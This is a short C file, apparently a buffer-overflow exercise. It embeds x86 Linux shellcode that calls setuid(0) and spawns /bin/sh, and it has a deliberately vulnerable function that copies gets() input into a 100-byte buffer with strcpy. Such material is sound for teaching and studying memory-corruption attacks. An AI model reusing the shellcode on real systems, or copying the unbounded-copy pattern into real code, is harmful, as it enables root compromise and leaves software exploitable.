/*bof.c*/
#include <string.h>
#include <stdio.h>

char shellcode[]="\x31\xc0\x89\xc3\xb0\x17\xcd\x80\x31\xd2"
		"\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89"
		"\xe3\x52\x53\x89\xe1\x8d\x42\x0b\xcd\x80";

void bof(char *str)
{
	char buffer[100];
	strcpy(buffer, str);
}

void main(int argc, char *argv[]) {
	char str[200];
	gets(str);
	bof(str);
	printf("BOF!");
}
